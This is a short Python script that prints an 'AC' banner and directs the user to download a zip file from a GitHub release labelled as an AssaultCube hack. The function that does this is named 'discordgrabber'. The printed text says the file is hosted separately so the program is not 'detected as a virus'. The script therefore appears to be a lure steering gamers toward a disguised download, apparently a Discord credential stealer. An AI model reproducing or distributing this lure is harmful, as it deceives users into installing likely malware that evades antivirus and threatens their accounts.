import time
import os
from datetime import date

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

today = date.today()
  
def clearcmd():
    os.system('cls' if os.name == 'nt' else 'clear')

def discordgrabber():
  print(bcolors.OKBLUE + "Today's date:",today)
  print(bcolors.OKBLUE + """                      
   _____  _________   
  /  _  \ \_   ___ \  
 /  /_\  \/    \  \/  
/    |    \     \____ 
\____|__  /\______  / 
        \/        \/                                    

              Download                                                                 
        """)
  print(bcolors.OKBLUE + """
    You need to download the file, since we don't want this program to get detected as a virus.
    Open the tutorial section in this program for a tutorial on how to use it.
    https://github.com/itsk0ntra/assault-cube-hack/releases/download/minor-update/download.zip
    """)
  time.sleep(10.00)
discordgrabber()
